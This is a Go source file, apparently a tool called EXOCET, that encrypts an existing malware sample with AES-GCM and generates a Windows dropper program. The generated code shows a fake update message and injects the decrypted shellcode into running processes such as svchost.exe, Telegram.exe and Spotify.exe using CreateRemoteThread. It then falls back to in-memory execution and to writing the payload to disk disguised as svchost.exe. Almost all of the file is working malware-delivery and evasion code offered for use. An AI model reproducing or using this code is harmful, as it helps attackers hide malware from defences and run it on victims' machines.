package ProcInject
// Experiment on process injection
import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"os"
)
//https://www.thepolyglotdeveloper.com/2018/02/encrypt-decrypt-data-golang-application-crypto-packages/
func createHash(key string) string {
	hasher := md5.New()
	hasher.Write([]byte(key))
	return hex.EncodeToString(hasher.Sum(nil))
}

func encrypt(data []byte, passphrase string) []byte {
	// creates a password hash
	block, _ := aes.NewCipher([]byte(createHash(passphrase)))
	// Galois Counter Mode Encryption, superior to AES Cipher Block Chaining
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		panic(err.Error())
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	// Returns ciphertext as bytes
	//fmt.Printf("%x", ciphertext)
	return ciphertext

}

func decrypt(data []byte, passphrase string) []byte {
	// Does not require a IV like AES-CBC
	// unhashes the decryption password by comparing hashes
	key := []byte(createHash(passphrase))
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err.Error())
	}
	return plaintext
}

func encryptFile(filename string, data []byte, passphrase string) {
	// Need to change this, to allow reading of files and encrypting it
	// This merely creates a file that is encrypted with a string
	f, _ := os.Create(filename)
	defer f.Close()
	f.Write(encrypt(data, passphrase))
}

func decryptFile(filename string, passphrase string) []byte {
	// Reads and decrypts and returns a string, which is what we don't want
	data, _ := ioutil.ReadFile(filename)

	return decrypt(data, passphrase)
}

func decryptMalware(encryptedMalware []byte, passphrase string) []byte {
	return decrypt(encryptedMalware, passphrase)
}

func encryptMalware(origMalware []byte, passphrase string) []byte {
	encryptedMalware := encrypt(origMalware, passphrase)
	//hexEncryptedMalware := fmt.Sprintf("%x",encryptedMalware)
	return encryptedMalware
}
//func readMalware(filename string) []byte {
//	var dat []byte
//	dat, err := ioutil.ReadFile(filename)
//	if err != nil {
//		fmt.Println("Error in readMalware(): %s",err)
//	}
//	return dat, err
//}
func writePayload(hexEncryptedMalware []byte, outputMalware string, encryptionPassword string) {
	//var templateGoFile []byte
	templateGoFile := fmt.Sprintf(`
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"encoding/hex"
	"io/ioutil"
	"fmt"
	"os/exec"
	"github.com/amenzhinsky/go-memexec"
   "syscall"
    "unsafe"
    "github.com/TheTitanrain/w32"
    "time"
)

var proc_list = map[interface{}]interface{} {
    // enter target processes here, the more the better..
	"svchost.exe": 0,
    "OneDrive.exe": 0,
    "Telegram.exe": 0,
    "Spotify.exe": 0,
    "Messenger.exe": 0,
}
var targeted_pids []uint32


func messagebox() {
    user32 := syscall.MustLoadDLL("user32.dll")
    mbox := user32.MustFindProc("MessageBoxW")

    title := "Error:"
    message := "Update starting, please do not close the window."
    mbox.Call(0,
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(message))),
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),
        0)
}

func getprocname(id uint32) string {
    snapshot := w32.CreateToolhelp32Snapshot(w32.TH32CS_SNAPMODULE, id)
    var me w32.MODULEENTRY32
    me.Size = uint32(unsafe.Sizeof(me))
    if w32.Module32First(snapshot, &me) {
        return w32.UTF16PtrToString(&me.SzModule[0])
    }
    return ""
}

func check_pid(pid uint32) bool {
    // check if pid evaluates to true or if pid is in targeted_pids slice-
    // return false else return true
    for _,val := range targeted_pids {
        if pid == 0 || pid == val {
            return false
        }
    }
    return true
}

func get_pids() {
    size := uint32(1000)
    procs := make([]uint32, size)
    var bytesReturned uint32
    for {
        for proc,_ := range proc_list {
            if w32.EnumProcesses(procs, size, &bytesReturned) {
                for _, pid := range procs[:int(bytesReturned)/4] {
                    if getprocname(pid) == proc {
                        // if pid is valid set proc_list's corresponding key equal to pid
                        if check_pid(pid) {
                            proc_list[proc] = pid
                        }
                    } else {
                        // sleep 15 milliseconds to limit cpu usage
                        time.Sleep(15 * time.Millisecond)
                    }          
                }
            }
        }
    }
}

func clear_pids() {
    // decrease/increase time based on proc_list length
    for {
        time.Sleep(15 * time.Minute)
        targeted_pids = targeted_pids[:0]
    }
}

func inject(shellcode []byte, pid uint32) {
    MEM_COMMIT := uintptr(0x1000)
    PAGE_EXECUTE_READWRITE := uintptr(0x40)
    PROCESS_ALL_ACCESS := uintptr(0x1F0FFF)

    // obtain necessary winapi functions from kernel32 for process injection
    kernel32 := syscall.MustLoadDLL("kernel32.dll")
    openproc := kernel32.MustFindProc("OpenProcess")
    vallocex := kernel32.MustFindProc("VirtualAllocEx")
    writeprocmem := kernel32.MustFindProc("WriteProcessMemory")
    createremthread := kernel32.MustFindProc("CreateRemoteThread")
    closehandle := kernel32.MustFindProc("CloseHandle")

    // inject & execute shellcode in target process' space
    processHandle, _, _ := openproc.Call(PROCESS_ALL_ACCESS, 
                                         0, 
                                         uintptr(pid))
    remote_buf, _, _ := vallocex.Call(processHandle,
                                      0,
                                      uintptr(len(shellcode)),
                                      MEM_COMMIT,
                                      PAGE_EXECUTE_READWRITE)
    writeprocmem.Call(processHandle,
                      remote_buf,
                      uintptr(unsafe.Pointer(&shellcode[0])),
                      uintptr(len(shellcode)),
                      0)
    createremthread.Call(processHandle,
                         0,
                         0,
                         remote_buf,
                         0,
                         0,
                         0)
    closehandle.Call(processHandle)
}

func injector(decryptedDat []byte) {
	shellcode := []byte(decryptedDat)
	go messagebox()
	go get_pids()
	go clear_pids()
	for {
		time.Sleep(1 * time.Second)
		for _, val := range proc_list {
			pid, _ := val.(uint32)
			if check_pid(pid) {
				inject(shellcode, pid)
				targeted_pids = append(targeted_pids,pid)

			} else {
				time.Sleep(1*time.Second)
			}
		}
	}
}

func createHash(key string) string {
	hasher := md5.New()
	hasher.Write([]byte(key))
	return hex.EncodeToString(hasher.Sum(nil))
}

func decrypt(data []byte, passphrase string) []byte {
	// Does not require a IV like AES-CBC
	// unhashes the decryption password by comparing hashes
	key := []byte(createHash(passphrase))
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err.Error())
	}
	return plaintext
}

func decryptFile(filename string, passphrase string) []byte {
	// Reads and decrypts and returns a string, which is what we don't want
	data, _ := ioutil.ReadFile(filename)

	return decrypt(data, passphrase)
}

func main() {
	dat := "%x"
	decodedDat, err := hex.DecodeString(dat)
	if err != nil {
		fmt.Printf("#{err}")
	}
	decryptedDat := decrypt([]byte(decodedDat), "%s")
	// First attempt injecting shellcode into running processes
	injector(decryptedDat)
	// Then attempt in-memory execution
	exe, err := memexec.New(decryptedDat)
	if err != nil {
		fmt.Printf("#{err]")
	}
	defer exe.Close()
	cmd := exe.Command()
	cmd.Output()
	// Then try to write a file on the disk and execute it
	ioutil.WriteFile("./svchost.exe", decryptedDat, 0777)
	exec.Command("svchost.exe")
}`, hexEncryptedMalware, encryptionPassword)
	ioutil.WriteFile(outputMalware, []byte(templateGoFile), 0777)
}
func main() {
	//fmt.Println("Starting the")
	fmt.Printf(`
The EXOCET Project. Part of the Slayer-Ranger's DSX Weapons Program.
`)
	args := os.Args
	if len(os.Args) < 4 {
		fmt.Printf("How to use:\r\n\tgo run EXOCET.go $PATH/malware outputMalware.go encryptionPassword\n")
		os.Exit(3)
	}
	origMalware := args[1]
	outputMalware := args[2]
	encryptionPassword := args[3]
	fmt.Printf("Original malware sample selected: %s\n",origMalware)
	fmt.Printf("Output malware sample selected: %s\n",outputMalware)
	fmt.Printf("Encryption password for AES Galois/Counter Mode %s\n", encryptionPassword)

	dat, err := ioutil.ReadFile(origMalware)
	//b64dat := base64.StdEncoding.EncodeToString(dat)
	if err != nil {
		fmt.Println(err)
	}

	// Attempt to create a hex encoded payload in another go file, where that other go file serves as a dropper
	hexEncryptedMalware := encryptMalware(dat, encryptionPassword)
	writePayload(hexEncryptedMalware, outputMalware, encryptionPassword)
	fmt.Printf("The malware Go file has been completed. To cross compile the malware dropper for Windows for example, run:\r\n\tenv GOARCH=amd64 GOOS=windows go build %s\n\nThat will return to you a executable\n", outputMalware)
}
